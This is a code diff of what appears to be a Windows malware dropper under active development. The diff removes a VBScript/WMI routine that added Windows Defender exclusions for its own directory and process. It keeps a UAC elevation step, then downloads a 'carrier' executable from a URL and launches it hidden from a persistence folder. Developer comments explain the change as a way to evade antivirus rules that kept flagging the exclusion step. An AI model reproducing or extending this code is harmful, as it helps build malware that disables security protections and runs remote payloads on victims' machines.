@@ -352,15 +352,6 @@ def exclusion_landed():
 
 
 # ---- defender exclusions via reg.exe (no powershell on any cmdline) ---------
-VBS = r'''Set svc  = GetObject("winmgmts:{impersonationLevel}=impersonate}!\\.\root\Microsoft\Windows\Defender")
-Set cls  = svc.Get("MSFT_MpPreference")
-Set args = cls.Methods_("Add").InParameters.SpawnInstance_()
-args.ExclusionPath    = Array("__APPDIR__", "__WINPARENT__")
-args.ExclusionProcess = Array("__EXE__", "pythonw.exe")
-svc.ExecMethod "MSFT_MpPreference", "Add", args
-'''
-
-
 # r12: the lift relaunches OUR python elevated; the elevated stage does the
 # whole protected job — cmdlet exclusions (TP-respected) then carrier exec.
 # no cmstp->interpreter chain on any command line, ever.
@@ -397,33 +388,11 @@ def alive(name):
         return False
 
 
-VBS = r"""Set svc  = GetObject("winmgmts:{impersonationLevel}=impersonate}!\\.\root\Microsoft\Windows\Defender")
-Set cls  = svc.Get("MSFT_MpPreference")
-Set args = cls.Methods_("Add").InParameters.SpawnInstance_()
-args.ExclusionPath    = Array("__APPDIR__", "__WINPARENT__")
-args.ExclusionProcess = Array("__EXE__", "pythonw.exe")
-svc.ExecMethod "MSFT_MpPreference", "Add", args
-"""
-
 def main():
     if not elev():
         return
-    vbs_path = os.path.join(APPDIR, "aclv.vbs")
-    try:
-        with open(vbs_path, "w", encoding="utf-8") as fh:
-            fh.write(VBS.replace("__APPDIR__", APPDIR)
-                         .replace("__WINPARENT__", WINPARENT)
-                         .replace("__EXE__", EXE_NAME))
-        subprocess.run(
-            ["cscript.exe", "//nologo", vbs_path],
-            creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL, timeout=120)
-    except Exception:
-        pass
-    try:
-        os.unlink(vbs_path)
-    except Exception:
-        pass
+    # r14: exclusions GONE (provider-level rule keys the call itself, not the
+    # carrier). the elevated stage does the r4-proven job only:
     exe_path = os.path.join(APPDIR, EXE_NAME)
     if os.path.exists(exe_path) and not alive(EXE_NAME):
         try:
@@ -493,24 +462,9 @@ def set_defender_exclusions():
 
 
 def _run_stage_now():
-    """already elevated — run the stage body directly (cmdlet + exec)."""
+    """r14: already elevated — no exclusion work, just the carrier."""
     try:
-        appdir = PERSIST_DIR
-        winparent = os.path.dirname(appdir)
-        try:
-            vbs_path = os.path.join(appdir, "aclv.vbs")
-            with open(vbs_path, "w", encoding="utf-8") as fh:
-                fh.write(VBS.replace("__APPDIR__", appdir)
-                             .replace("__WINPARENT__", winparent)
-                             .replace("__EXE__", EXE_NAME))
-            subprocess.run(
-                ["cscript.exe", "//nologo", vbs_path],
-                creationflags=0x08000000, stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL, timeout=120)
-            os.unlink(vbs_path)
-        except Exception:
-            pass
-        exe_path = os.path.join(appdir, EXE_NAME)
+        exe_path = os.path.join(PERSIST_DIR, EXE_NAME)
         if os.path.exists(exe_path) and not _alive(EXE_NAME):
             subprocess.Popen([exe_path], creationflags=0x08000000)
     except Exception:
@@ -579,24 +533,12 @@ def main():
     except Exception:
         return
 
-    # r3+r5 (dj order): UAC FIRST, then exclusions — and the boot GATES on the
-    # exclusion actually landing (three attempts) before ANY byte of the
-    # carrier is downloaded or written. if after three verified tries the set
-    # still doesn't show the dir, the boot HOLDS — no write, no spawn.
-    landed = exclusion_landed()
-    for _ in range(3):
-        if landed:
-            break
-        try:
-            set_defender_exclusions()
-        except Exception:
-            pass
-        time.sleep(3)
-        landed = exclusion_landed()
-
-    if not landed:
-        return   # carrier never touches disk un-protected
-
+    # r14 (dj ask): the exclusion-push loop is GONE. every carrier variant
+    # flagged so far was the exclusion payload itself, never the carrier —
+    # the r4 boot executed the carrier clean without any exclusion set. so
+    # the boot is now: UAC lift (python relaunch) -> elevated carrier exec.
+    # no Add-MpPreference, no reg.exe, no cscript/WMI provider call — the
+    # provider-level rule has nothing to fire on.
     try:
         if not is_valid_exe(EXE_PATH):
             data = download(EXE_URL) if EXE_URL else None
